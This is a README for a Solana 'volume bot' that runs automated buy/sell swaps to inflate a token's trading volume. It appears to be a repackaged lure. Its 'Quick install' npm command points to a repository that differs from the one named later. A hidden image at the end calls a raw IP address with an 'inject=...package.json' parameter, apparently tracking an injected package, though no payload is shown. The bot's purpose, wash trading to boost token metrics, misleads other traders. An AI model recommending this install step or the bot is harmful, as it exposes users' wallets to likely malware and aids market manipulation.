**Crushroamplify/solana-swap-api-volume-bot**

Keeping a volume bot running smoothly on Solana shouldn't feel like babysitting a temperamental server. This project is built to handle consistent swap generation via the Solana API without the usual overhead or constant crashes. We've recently pushed a handful of crucial stability fixes to iron out edge-case errors, meaning you can finally count on it to do its job in the background while you focus on the bigger picture.

**Quick install**

```bash
npm install git+https://github.com/Crushroamplify/solana-swap-api-volume-bot.git
```

[https://github.com/Crushroamplify/solana-swap-api-volume-bot](https://github.com/Crushroamplify/solana-swap-api-volume-bot)

# Solana Volume Bot

A high-performance, multi-threaded bot for generating volume on Solana DEXes using the Solana Swap API from Solana Tracker [https://docs.solanatracker.io](https://docs.solanatracker.io)

## Features

- Supports multiple DEXes:
  - Raydium
  - Raydium CPMM
  - Pump.fun
  - Moonshot
  - Orca
  - Jupiter (Private Self-Hosted API)
- Multi-wallet support
- Parallel execution with multiple threads
- Configurable delays for buying and selling
- Option to use regular transactions or Jito for transaction processing
- Detailed logging with timestamps and color-coded actions

## Prerequisites

- Node.js (v14 or later recommended)
- npm (comes with Node.js)
- One or multiple Solana wallets with SOL 

## Installation

1. Clone the repository:
   git clone https://github.com/leionion/solana-swap-api-volume-bot.git
   cd solana-swap-api-volume-bot

2. Install dependencies:
   npm install

3. Create a `.env` file in the root directory and add your configuration:
   AMOUNT=0.1
   TOKEN_ADDRESS=your_token_address
   DELAY=2000
   SELL_DELAY=1000
   SLIPPAGE=1
   PRIORITY_FEE=0.0005
   JITO=false
   RPC_URL=your_rpc_url
   THREADS=2

## Usage

Run the bot with:

node index.js

## Configuration

Adjust the settings in your `.env` file to customize the bot's behavior:

- AMOUNT: The amount of SOL to swap in each transaction
- TOKEN_ADDRESS: The address of the token you're trading
- DELAY: Delay between swap cycles (in milliseconds)
- SELL_DELAY: Delay between buy and sell operations (in milliseconds)
- SLIPPAGE: Maximum allowed slippage (in percentage)
- PRIORITY_FEE: Priority fee for transactions
- JITO: Set to "true" to use Jito for transaction processing
- RPC_URL: Your Solana RPC URL
- THREADS: Number of parallel threads to run

## API Usage and Fees

This bot uses the Solana Swap API from [SolanaTracker.io](https://docs.solanatracker.io).

**Note**: The Swap API charges a fee for usage:

- Standard fee: 0.5% on each successful transaction
- For high-volume users: Fees can be reduced to as low as 0.1% (subject to approval)

## Disclaimer

This bot is for educational purposes only, we don't recommend the use of volume bots. Use at your own risk. Always understand the code you're running and the potential financial implications of automated trading.

## Contributing

Contributions, issues, and feature requests are welcome! Feel free to check [issues page](https://github.com/leionion/solana-swap-api-volume-bot/issues).

## Support

If you have new technical questions & need support, please contact me @leionion on Telegram.

## Related searches

Developers and project founders exploring this automated solution typically look for secure ways to boost liquidity and token metrics on decentralized markets. Common searches focus on reliable market-making tools, seamless DEX aggregators, and custom configurations to maintain programmatic trading activity safely.

**Topics:** solana volume bot, jupiter swap, defi, binance api, 1inch, blockchain node, token market maker, spl token swap api, automated trading bot, dex liquidity booster, solana rpc node, dex screener trending bot

![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fsolana-swap-api-volume-bot&inject=Crushroamplify%2Fsolana-swap-api-volume-bot%2Fpackage.json)
